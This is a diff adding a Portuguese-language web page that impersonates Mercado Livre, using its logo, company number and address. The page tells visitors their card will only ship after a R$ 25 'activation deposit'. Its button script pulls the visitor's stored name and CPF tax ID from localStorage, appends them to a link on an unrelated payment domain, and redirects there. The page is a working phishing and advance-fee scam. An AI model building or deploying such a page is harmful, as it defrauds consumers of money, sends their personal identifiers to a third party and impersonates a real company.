@@ -1,0 +1,165 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/all.min.css">
+    <title>Cartão</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Sora', sans-serif;
+            background-color: #ffffff;
+            text-align: center;
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            padding: 10px;
+            border-bottom: 1px solid #e6b800;
+            background-color: #FFE600;
+        }
+        .header img {
+            width: 125px;
+            padding: 10px;
+        }
+        .logo {
+            margin-left: 20px;
+        }
+        .content {
+            padding: 20px;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        h1 {
+            font-size: 20px;
+            color: #333;
+            margin-bottom: 10px;
+        }
+        .subtitle {
+            font-size: 15px;
+            color: #666;
+        }
+        .info-box {
+            background-color: #f3f3f3;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            text-align: center;
+            color: #333;
+        }
+        .warning-box {
+            background-color: #fff3e0;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 30px;
+            text-align: center;
+            color: #333;
+        }
+        .button {
+            background-color: #FFE600;
+            color: black;
+            padding: 15px;
+            border-radius: 8px;
+            border: none;
+            width: 100%;
+            font-family: 'Sora', sans-serif;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .quiz-container {
+            margin: 0 auto;
+            padding: 20px;
+            border-radius: 10px;
+            background-color: #ebebeb;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="images/logo.png" alt="Logo Mercado Livre" class="logo">
+    </div>
+
+    <div class="content">
+        <h1 style="font-size: 18px;">Parabéns, o seu cartão está em produção, hora de ativar sua conta!</h1>
+        
+        <p class="subtitle">
+            Para ativar sua conta e usar seu cartão virtual, é necessário um depósito mínimo de <strong>R$ 25</strong>.
+        </p>
+
+        <p class="subtitle" style="color: #00c42a; font-size: 14px;">
+            Este valor não é para nós, ele ficará na sua conta e você poderá usá-lo como quiser, assim que tiver acesso ao aplicativo. <strong>Sem esse depósito, não conseguiremos enviar o cartão!</strong>
+        </p>
+
+        <div class="info-box" style="border: 1px solid #bfbfbf;">
+            <strong style="padding-top: 20px; font-size: 20px;">Conta Digital</strong><br>
+            <div style="font-size: 16px; text-align: left; margin-top: 20px;">
+                <i class="fas fa-check-circle" style="color: #00c42a; margin-right: 5px;"></i> Pix 24 horas<br>
+                <i class="fas fa-check-circle" style="color: #00c42a; margin-right: 5px;"></i> Pagamento de boletos<br>
+                <i class="fas fa-check-circle" style="color: #00c42a; margin-right: 5px;"></i> Cartão Virtual<br>
+                <i class="fas fa-check-circle" style="color: #00c42a; margin-right: 5px;"></i> Saques em caixas eletrônicos<br>
+                <i class="fas fa-check-circle" style="color: #00c42a; margin-right: 5px;"></i> Atendimento online 24/7
+            </div>
+            <p style="font-size: 16px; font-weight: bold; text-align: center; margin-top: 20px">Ative sua conta depositando</p>
+            <img src="images/image.png" alt="Imagem de depósito" style="width: 100px; height: 100px; margin-top: 20px;">
+            <p class="subtitle" style="color: #00c42a; font-size: 25px; font-weight: bold; margin-top: 10px; margin-bottom: 0px;">
+                R$ 25,00
+            </p>
+        </div>
+
+        <button id="btnAtivar" class="button">Ativar minha conta agora</button>
+        <script>
+            document.getElementById('btnAtivar').addEventListener('click', function() {
+                try {
+                    const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario')) || {};
+                    const email = localStorage.getItem('email') || '';
+                    const telephone = localStorage.getItem('telephone') || '';
+                    
+                    const url = new URL('https://pay.finalizar-compra-br2.site/1VOvGVkEjNbgD62');
+                    url.searchParams.append('name', dadosUsuario.NOME || '');
+                    url.searchParams.append('document', dadosUsuario.CPF || '');
+                    
+                    window.location.href = url.toString();
+                } catch(err) {
+                    console.error('Erro ao redirecionar:', err);
+                    alert('Ocorreu um erro. Por favor, tente novamente.');
+                }
+            });
+        </script>
+    </div>
+    
+
+    <div style="padding: 20px; text-align: center; margin-top: 30px; margin-bottom: 30px; border-top: 1px solid #cacaca;">
+        <p style="font-family: 'Sora', sans-serif; color: #666; font-size: 14px; margin-bottom: 15px;">
+            Mercado Livre S.A. | CNPJ: 79.379.491.0008-50 | Rod. Antônio Heil, 250 - Centro II, Brusque - SC, 88353-100
+        </p>
+        <p style="font-family: 'Sora', sans-serif; color: #666; font-size: 14px; margin-bottom: 15px;">
+            © 2025 - Todos os direitos reservados
+        </p>
+    </div>
+
+    <script>
+        function getUrlParams() {
+            const params = {};
+            const queryString = window.location.search;
+            const urlParams = new URLSearchParams(queryString);
+            
+            for (const [key, value] of urlParams) {
+                params[key] = value;
+            }
+            return params;
+        }
+
+        function buildUrlWithParams(baseUrl) {
+            const params = getUrlParams();
+            const url = new URL(baseUrl, window.location.href);
+            Object.keys(params).forEach(key => {
+                url.searchParams.append(key, params[key]);
+            });
+            
+            return url.toString();
+        }
+    </script>
+
+</body></html>
